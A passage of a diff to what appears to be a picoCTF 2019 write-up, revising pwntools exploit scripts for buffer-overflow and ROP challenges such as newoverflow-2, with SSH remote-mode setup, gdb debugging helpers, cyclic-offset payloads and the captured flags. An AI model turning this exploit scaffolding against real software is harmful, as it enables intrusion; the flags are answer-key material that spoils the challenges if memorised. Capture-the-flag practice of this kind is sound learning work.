+            local = True
+            break
+        elif str('debug') in mode:
+            debug = True
+            break
+        elif i == 0:
+            log.info(f'Exploit mode entered incorrectly. Maximum number of retries exceeded: {i}. Exiting... >_<')
+            exit()
+        else:
+            i -= 1
+            log.info('')
+            log.info(f'Incorrect mode selected. Enter local, remote, or debug only')
+            log.info(f'Number of retries: {i}')
+            log.info('')
+            log.info('')
+        
+    if debug:
+        io = process(exe)
+        attach_gdb()
+        log.info('')
+        log.info('')
+        log.info('Attaching gdb to running process')
+        log.info(f'gdb script = {script}')
+        log.info('Opening pwndbg...')
+        log.info('')
+        log.info('')
 
     elif remote:
-      context.update(log_level = 'error')
-      s = ssh(host=r_host, user=r_user, password=r_passwd)
-      io = s.process(exe, cwd=r_dir)
-      log.info('Remote variables set:')
-      log.info('Remote host = ', str(r_host))
-      log.info('Remote user = ', str(r_user))
-      log.info('Changing working directory to: ', str(r_dir))
-      log.info('Starting remote exploit...')
+        context.update(log_level = 'info')
+        s = ssh(host=r_host, user=r_user, password=r_passwd)
+        io = s.process(exe, cwd=r_dir)
+        log.info('')
+        log.info('')
+        log.info('Remote variables set:')
+        log.info(f'Remote host = {r_host}')
+        log.info(f'Remote user = {r_user}')
+        log.info(f'Changing working directory to: {r_dir} ')
+        log.info('Starting remote exploit...')
+        log.info('')
+        log.info('')
+
+    elif local:
+        io = process(exe)
+        log.info('Starting local exploit ...')
+        log.info('')
+        log.info('')
 
     else:
-      io = process(exe)
-      log.info('Starting local exploit ...')
+        log.info('Incorrect mode selected. Exiting...  >_< ')
+        exit()  
+ 
+# ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ #
+# Finish()                                                   #
+# ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ #
+# Prints script run time and then closes the running process.#
+# ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ #
 
 def finish():
   global end
-  global begin
+  
   end = time.time()
-  print('Time elapsed: ', end - begin)
+  run_time = end - begin
+  io.close()
+  print(f'Time elapsed: {run_time:.2f}')
 
-#===========================================================
-#                    EXPLOIT GOES HERE
-#===========================================================
+##############################################################
+#=========================================================== #
+#                    EXPLOIT GOES HERE                       #
+#=========================================================== #
+##############################################################
+
 start()
 
 padding = cyclic(cyclic_find('saaa'))          # location of pattern match @ rsp
@@ -611,12 +1122,15 @@ payload += flag
 
 io.sendline(payload)
 
-print(repr(io.recvall())
+get_flag()
 
 finish()
-#===========================================================
-#                       END OF SCRIPT                      
-#===========================================================
+
+##############################################################
+#============================================================#
+#                       END OF SCRIPT                        #
+#============================================================#
+##############################################################
 ~~~
 
 **Flag:** *picoCTF{th4t_w4snt_t00_d1ff3r3nt_r1ghT?_7a154fef}*
@@ -639,77 +1153,177 @@ finish()
 # -*- coding: utf-8 -*-
 
 from pwn import *
-
-#=========================================================
-#                   SETTING UP VARIABLES
-#=========================================================
+############################################################
+#==========================================================#
+#                   SETTING UP VARIABLES                   #
+#==========================================================#
+############################################################
 
 os ='linux'
-arch ='AMD64'    
+arch ='i386' 
+exe = './vuln'
+script = 'b* main'
 r_host = '2019shell1.picoctf.com'
 r_dir = '/problems/newoverflow-2_2_1428488532921ee33e0ceb92267e30a7'
 r_user = 'User'
 r_passwd = 'Pa$$w0rd'
-# r_port = ''                                            
-exe = './vuln'
-argv = sys.argv
-gdbscript = 'b* main'
+r_port = '1234' 
 s = ''
+local = False
+remote = False
+debug = False
+mode = ''
 io = ''
+data = ''
 begin = ''
 end = ''
-data = ''
+i = ''
 
-                  # Context variables # 
-
-context.log_level = 'info'
+context.log_level = 'debug'
 context.update(os=os, arch=arch)
+#############################################################
+#===========================================================#
+#                   FUNCTION DEFINITIONS                    #
+#===========================================================#
+#############################################################
 
-#==========================================================
-#                   FUNCTION DEFINITIONS
-#==========================================================
+# ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ #
+# attach_gdb()                                              #
+# ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ #
+# Attaches gdb to the running process.                      #
+# ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ #
 
 def attach_gdb():
-        gdb.attach(io, gdbscript=gdbscript)
+    gdb.attach(io, gdbscript=script)
+    
+# ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ #
+# get_flag()                                                #
+# ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ #
+# Checks output for the 'pico' flag and either prints it or #
+# exits if no data is sent.                                 #
+# ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ #
 
-def start(argv=[], *a, **kw):
+def get_flag():
+    global data
+    global io
+
+    data = io.recv(timeout=5)
+
+    if data == b'':
+        log.info('')
+        log.info('')
+        log.info('Something went wrong, no data received. Exiting... >_<')
+        exit()
+
+    if b'pico' in data:
+        log.info('')
+        log.info('')
+        log.info(f"Pwned! Here's your flag: {data}")
+        log.info('')
+        log.info('')
+
+    io.close()
+    
+# ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ #
+# Start()                                                   #
+# ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ #
+# Prompts for the startup mode (local, remote, debug) and   #
+# sets the appropriate variables and startup assignemnts.   #
+# loops 3 times for input if not entered in correctly.      #
+# ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ #
+
+def start():
+    global local
+    global remote
+    global debug
     global begin
-    global exe
+    global mode
     global io
     global s
+
+    i = 3
+
     begin = time.time()
-    if gdb:
-      io = process(exe)
-      context.update(log_level = 'debug')
-      attach_gdb()
-      log.info('Setting log level to %s', str(context.log_level))
-      log.info('Attaching gdb to running process')
-      log.info('gdb script = %s', str(gdbscript))
-      log.info('Starting debug exploit...')
+    
+    while i != 0:
+        print('')
+        mode = input('Start exploit in local, remote or debug mode? ')
+        print('')
+        if str('remote') in mode:
+            remote = True
+            break
+        elif str('local') in mode:
+            local = True
+            break
+        elif str('debug') in mode:
+            debug = True
+            break
+        elif i == 0:
+            log.info(f'Exploit mode entered incorrectly. Maximum number of retries exceeded: {i}. Exiting... >_<')
+            exit()
+        else:
+            i -= 1
+            log.info('')
+            log.info(f'Incorrect mode selected. Enter local, remote, or debug only')
+            log.info(f'Number of retries: {i}')
+            log.info('')
+            log.info('')
+        
+    if debug:
+        io = process(exe)
+        attach_gdb()
+        log.info('')
+        log.info('')
+        log.info('Attaching gdb to running process')
+        log.info(f'gdb script = {script}')
+        log.info('Opening pwndbg...')
+        log.info('')
+        log.info('')
 
     elif remote:
-      context.update(log_level = 'error')
-      s = ssh(host=r_host, user=r_user, password=r_passwd)
-      io = s.process(exe, cwd=r_dir)
-      log.info('Remote variables set:')
-      log.info('Remote host = ', str(r_host))
-      log.info('Remote user = ', str(r_user))
-      log.info('Changing working directory to: ', str(r_dir))
-      log.info('Starting remote exploit...')
+        context.update(log_level = 'info')
+        s = ssh(host=r_host, user=r_user, password=r_passwd)
+        io = s.process(exe, cwd=r_dir)
+        log.info('')
+        log.info('')
+        log.info('Remote variables set:')
+        log.info(f'Remote host = {r_host}')
+        log.info(f'Remote user = {r_user}')
+        log.info(f'Changing working directory to: {r_dir} ')
+        log.info('Starting remote exploit...')
+        log.info('')
+        log.info('')
+
+    elif local:
+        io = process(exe)
+        log.info('Starting local exploit ...')
+        log.info('')
+        log.info('')
 
     else:
-      io = process(exe)
-      log.info('Starting local exploit ...')
+        log.info('Incorrect mode selected. Exiting...  >_< ')
+        exit()  
+ 
+# ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ #
+# Finish()                                                   #
+# ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ #
+# Prints script run time and then closes the running process.#
+# ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ #
 
 def finish():
   global end
-  global begin
+  
   end = time.time()
-  print('Time elapsed: ', end - begin)
+  run_time = end - begin
+  io.close()
+  print(f'Time elapsed: {run_time:.2f}')
 
-#===========================================================
-#                    EXPLOIT GOES HERE
-#===========================================================
+##############################################################
+#=========================================================== #
+#                    EXPLOIT GOES HERE                       #
+#=========================================================== #
+##############################################################
+
 start()
 
 padding = cyclic(72)          # location of pattern match @ rsp
@@ -722,12 +1336,15 @@ payload += flag
 
 io.sendline(payload)
 
-print(repr(io.recvall())
+get_flag()
 
 finish()
-#===========================================================
-#                       END OF SCRIPT                      
-#===========================================================
+
+##############################################################
+#============================================================#
+#                       END OF SCRIPT                        #
+#============================================================#
+##############################################################
 ~~~
 
 **Flag:** *picoCTF{r0p_1t_d0nT_st0p_1t_64362a2b}*
